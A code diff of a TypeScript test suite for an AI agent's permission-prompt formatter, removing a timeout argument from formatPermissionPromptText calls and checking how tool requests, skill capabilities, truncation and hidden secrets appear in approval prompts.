-    const text = formatPermissionPromptText(
-      {
-        requestId: 'permission_123',
-        sourceAgentFolder: 'main_agent',
-        toolName: 'Bash',
-        toolInput: { command: 'git status --short' },
-      },
-      60_000,
-    );
+    const text = formatPermissionPromptText({
+      requestId: 'permission_123',
+      sourceAgentFolder: 'main_agent',
+      toolName: 'Bash',
+      toolInput: { command: 'git status --short' },
+    });
 
     expect(text).toContain('Context: agent chat');
     expect(text).not.toContain('scheduled job');
   });
 
   it('renders skill action capability prompts with the semantic display name', () => {
-    const text = formatPermissionPromptText(
-      {
-        requestId: 'permission_123',
-        sourceAgentFolder: 'main_agent',
-        toolName: 'RunCommand',
-        toolInput: {
-          command: 'skills/linkedin-posting/publish --draft post.md',
+    const text = formatPermissionPromptText({
+      requestId: 'permission_123',
+      sourceAgentFolder: 'main_agent',
+      toolName: 'RunCommand',
+      toolInput: {
+        command: 'skills/linkedin-posting/publish --draft post.md',
+      },
+      suggestions: [
+        {
+          type: 'addRules',
+          behavior: 'allow',
+          destination: 'session',
+          rules: [{ toolName: 'capability:skill.linkedin-posting.publish' }],
         },
-        suggestions: [
-          {
-            type: 'addRules',
-            behavior: 'allow',
-            destination: 'session',
-            rules: [{ toolName: 'capability:skill.linkedin-posting.publish' }],
-          },
-        ],
-        semanticCapabilityDefinitions: {
-          'skill.linkedin-posting.publish': {
-            capabilityId: 'skill.linkedin-posting.publish',
-            displayName: 'LinkedIn posting',
-            category: 'LinkedIn posting',
-            risk: 'write',
-            can: 'Publish posts through the selected LinkedIn posting skill.',
-            cannot:
-              'Use unrelated skills, credentials, settings, or broader commands.',
-            credentialSource: 'skill_secret',
-            implementationBindings: [
-              {
-                kind: 'tool_rule',
-                rule: 'RunCommand(skills/linkedin-posting/publish *)',
-              },
-            ],
-            preflight: { kind: 'none' },
-            sandboxProfile: {
-              network: 'required',
-              filesystem: 'workspace_write',
+      ],
+      semanticCapabilityDefinitions: {
+        'skill.linkedin-posting.publish': {
+          capabilityId: 'skill.linkedin-posting.publish',
+          displayName: 'LinkedIn posting',
+          category: 'LinkedIn posting',
+          risk: 'write',
+          can: 'Publish posts through the selected LinkedIn posting skill.',
+          cannot:
+            'Use unrelated skills, credentials, settings, or broader commands.',
+          credentialSource: 'skill_secret',
+          implementationBindings: [
+            {
+              kind: 'tool_rule',
+              rule: 'RunCommand(skills/linkedin-posting/publish *)',
             },
+          ],
+          preflight: { kind: 'none' },
+          sandboxProfile: {
+            network: 'required',
+            filesystem: 'workspace_write',
           },
         },
       },
-      60_000,
-    );
+    });
 
     expect(text).toContain('Allow Main Agent to use LinkedIn posting?');
     expect(text).toContain('Risk: Write');
@@ -1573,7 +1402,7 @@ describe('permission interaction', () => {
       ],
     } satisfies PermissionApprovalRequest;
 
-    const text = formatPermissionPromptText(request, 60_000);
+    const text = formatPermissionPromptText(request);
 
     expect(firstPersistentRule(request)).toBeUndefined();
     expect(permissionDecisionOptions(request)).toEqual([
@@ -1588,63 +1417,51 @@ describe('permission interaction', () => {
   });
 
   it('renders typed tool input families without JSON dumps', () => {
-    const edit = formatPermissionPromptText(
-      {
-        requestId: 'permission_123',
-        sourceAgentFolder: 'main_agent',
-        toolName: 'Edit',
-        toolInput: {
-          file_path: '/repo/app.ts',
-          old_string: 'const unsafe = true;',
-          new_string: 'const unsafe = false;',
-        },
+    const edit = formatPermissionPromptText({
+      requestId: 'permission_123',
+      sourceAgentFolder: 'main_agent',
+      toolName: 'Edit',
+      toolInput: {
+        file_path: '/repo/app.ts',
+        old_string: 'const unsafe = true;',
+        new_string: 'const unsafe = false;',
       },
-      60_000,
-    );
+    });
     expect(edit).toContain('File: /repo/app.ts');
     expect(edit).toContain(
       '```diff\n-const unsafe = true;\n+const unsafe = false;\n```',
     );
 
-    const read = formatPermissionPromptText(
-      {
-        requestId: 'permission_123',
-        sourceAgentFolder: 'main_agent',
-        toolName: 'Read',
-        toolInput: { file_path: '/repo/README.md' },
-      },
-      60_000,
-    );
+    const read = formatPermissionPromptText({
+      requestId: 'permission_123',
+      sourceAgentFolder: 'main_agent',
+      toolName: 'Read',
+      toolInput: { file_path: '/repo/README.md' },
+    });
     expect(read).toContain('Path: /repo/README.md');
     expect(read).not.toContain('```json');
 
-    const webFetch = formatPermissionPromptText(
-      {
-        requestId: 'permission_123',
-        sourceAgentFolder: 'main_agent',
-        toolName: 'WebFetch',
-        toolInput: {
-          url: 'https://example.com/docs',
-          prompt: 'Summarize the setup section.',
-        },
+    const webFetch = formatPermissionPromptText({
+      requestId: 'permission_123',
+      sourceAgentFolder: 'main_agent',
+      toolName: 'WebFetch',
+      toolInput: {
+        url: 'https://example.com/docs',
+        prompt: 'Summarize the setup section.',
       },
-      60_000,
-    );
+    });
     expect(webFetch).toContain('URL: https://example.com/docs');
     expect(webFetch).toContain('Prompt: Summarize the setup section.');
   });
 
   it('renders unknown tool input as clean key/value lines (not a JSON dump), nested objects omitted', () => {
     const longValue = `lookup ${'x'.repeat(650)} tail`;
-    const text = formatPermissionPromptText(
-      {
-        requestId: 'permission_123',
-        sourceAgentFolder: 'main_agent',
-        toolName: 'mcp__thirdparty__unknown',
-        toolInput: { query: longValue, nested: { ok: true } },
-      },
-      60_000,
-    );
+    const text = formatPermissionPromptText({
+      requestId: 'permission_123',
+      sourceAgentFolder: 'main_agent',
+      toolName: 'mcp__thirdparty__unknown',
+      toolInput: { query: longValue, nested: { ok: true } },
+    });
 
     expect(text).toContain('Query: lookup ');
     expect(text).toContain('tail');
@@ -1655,15 +1472,12 @@ describe('permission interaction', () => {
   });
 
   it('renders any command-shaped permission input without a JSON dump', () => {
-    const text = formatPermissionPromptText(
-      {
-        requestId: 'permission_123',
-        sourceAgentFolder: 'main_agent',
-        toolName: 'mcp__thirdparty__run',
-        toolInput: { command: 'acme publish draft-123' },
-      },
-      60_000,
-    );
+    const text = formatPermissionPromptText({
+      requestId: 'permission_123',
+      sourceAgentFolder: 'main_agent',
+      toolName: 'mcp__thirdparty__run',
+      toolInput: { command: 'acme publish draft-123' },
+    });
 
     expect(text.split('\n')[0]).toBe(
       '🔐 Allow Main Agent to use exact command access?',
@@ -1710,7 +1524,7 @@ describe('permission interaction', () => {
       toolInput: { command: 'npm test' },
     } satisfies PermissionApprovalRequest;
 
-    const prompt = formatPermissionPromptText(request, 60_000);
+    const prompt = formatPermissionPromptText(request);
     expect(prompt).not.toContain('Scope:');
 
     const persistentReceipt = formatPermissionReceiptText(
@@ -1828,17 +1642,14 @@ describe('permission interaction', () => {
     for (let index = 0; index < 100; index += 1) {
       wideInput[`extra_${index}`] = `value_${index}`;
     }
-    const text = formatPermissionPromptText(
-      {
-        requestId: 'permission_123',
-        sourceAgentFolder: 'main_agent',
-        toolName: 'mcp__thirdparty__unknown',
-        decisionReason: `needs token=abc12345678901234567890 ${'x'.repeat(4_000)}`,
-        description: `password: top-secret-value ${'y'.repeat(4_000)}`,
-        toolInput: wideInput,
-      },
-      60_000,
-    );
+    const text = formatPermissionPromptText({
+      requestId: 'permission_123',
+      sourceAgentFolder: 'main_agent',
+      toolName: 'mcp__thirdparty__unknown',
+      decisionReason: `needs token=abc12345678901234567890 ${'x'.repeat(4_000)}`,
+      description: `password: top-secret-value ${'y'.repeat(4_000)}`,
+      toolInput: wideInput,
+    });
 
     expect(text.length).toBeLessThanOrEqual(2_800);
     expect(text).not.toContain('Reason:');
@@ -1879,15 +1690,12 @@ describe('permission interaction', () => {
 
   it('preserves long command head and tail in prompt and receipt summaries', () => {
     const command = `curl https://api.example.com/${'a'.repeat(1_300)} > /tmp/out`;
-    const text = formatPermissionPromptText(
-      {
-        requestId: 'permission_123',
-        sourceAgentFolder: 'main_agent',
-        toolName: 'Bash',
-        toolInput: { command },
-      },
-      60_000,
-    );
+    const text = formatPermissionPromptText({
+      requestId: 'permission_123',
+      sourceAgentFolder: 'main_agent',
+      toolName: 'Bash',
+      toolInput: { command },
+    });
     const receipt = formatPermissionReceiptText(
       'permission_123',
       {
